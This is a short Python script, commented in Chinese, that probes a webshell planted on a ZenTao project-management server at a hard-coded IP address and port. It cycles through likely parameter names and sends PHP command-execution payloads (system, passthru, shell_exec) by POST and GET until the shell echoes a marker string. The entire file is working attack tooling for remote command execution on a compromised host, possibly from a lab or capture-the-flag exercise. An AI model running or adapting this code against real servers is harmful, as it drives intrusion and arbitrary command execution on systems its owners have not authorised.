#!/usr/bin/env python3
"""
禅道 Webshell 测试脚本 - 探测正确的调用方式
"""

import requests
import sys

requests.packages.urllib3.disable_warnings()

def test_webshell():
    shell_url = "http://47.113.178.182:32829/zentao/data/client/1/shell.php"

    print(f"[*] 测试 Webshell: {shell_url}\n")

    # 测试 1: 直接访问，查看响应
    print("=" * 70)
    print("测试 1: 直接 GET 访问")
    print("=" * 70)
    try:
        resp = requests.get(shell_url, timeout=10)
        print(f"状态码: {resp.status_code}")
        print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
        print(f"响应长度: {len(resp.content)} bytes")
        print(f"响应内容:\n{resp.text[:500]}")
    except Exception as e:
        print(f"错误: {e}")

    # 测试 2: 尝试不同的参数名
    print("\n" + "=" * 70)
    print("测试 2: 尝试不同的 POST 参数名")
    print("=" * 70)

    test_command = "echo 'WEBSHELL_TEST'"
    param_names = ['cmd', 'c', 'command', 'exec', 'shell', 'a', 'x', '1', 'code', 'eval']

    for param in param_names:
        print(f"\n[*] 测试参数名: {param}")

        # 尝试不同的执行方式
        payloads = [
            {param: f"system('{test_command}');"},
            {param: f"{test_command}"},
            {param: f"passthru('{test_command}');"},
            {param: f"echo shell_exec('{test_command}');"},
        ]

        for i, payload in enumerate(payloads):
            try:
                resp = requests.post(shell_url, data=payload, timeout=10)
                if resp.text.strip() and 'WEBSHELL_TEST' in resp.text:
                    print(f"  ✓ 成功! 参数={param}, 方式={i+1}")
                    print(f"    响应: {resp.text.strip()}")
                    return param, i
            except Exception as e:
                pass

    print("\n[-] 未找到有效的调用方式")

    # 测试 3: 尝试 GET 参数
    print("\n" + "=" * 70)
    print("测试 3: 尝试 GET 参数")
    print("=" * 70)

    for param in param_names:
        try:
            test_url = f"{shell_url}?{param}=system('echo WEBSHELL_TEST');"
            resp = requests.get(test_url, timeout=10)
            if 'WEBSHELL_TEST' in resp.text:
                print(f"  ✓ 成功! GET 参数={param}")
                print(f"    响应: {resp.text.strip()}")
                return param, 'GET'
        except Exception as e:
            pass

    # 测试 4: 尝试读取 shell.php 源码
    print("\n" + "=" * 70)
    print("测试 4: 尝试其他方式查看 Webshell 内容")
    print("=" * 70)

    # 尝试用空 POST 请求
    try:
        resp = requests.post(shell_url, data={}, timeout=10)
        print(f"空 POST 响应: {resp.text[:200]}")
    except Exception as e:
        print(f"错误: {e}")

    return None, None

if __name__ == "__main__":
    test_webshell()
